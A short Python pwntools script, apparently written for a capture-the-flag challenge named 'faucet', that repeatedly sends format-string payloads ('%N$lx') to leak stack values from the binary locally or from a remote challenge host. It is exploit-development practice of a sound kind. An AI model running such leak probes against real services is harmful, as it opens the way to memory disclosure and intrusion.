#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

context.update(arch='amd64')
exe = './faucet'
HOST = 'challenge.ctf.games'
PORT = 31388

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

j = 1
for rounds in range(10):
    print(f"new round {rounds}")
    try:
        p = start()
        for i in range(1,9):
            p.recvuntil(b">")
            p.sendline(b"5")
            p.recvuntil(b"?:")
            payload = b"AAAAAAAA "
            payload += b"%"
            payload += str(j).encode('utf-8')
            payload += b"$lx"
            p.sendline(payload)
            resp = p.recvline()
            j += 1
            time.sleep(0.5)
            print(f'leak offset {j-1}: {resp.split()[-1]}')
        p.close()
    except Exception as e:
        print(e)
        continue
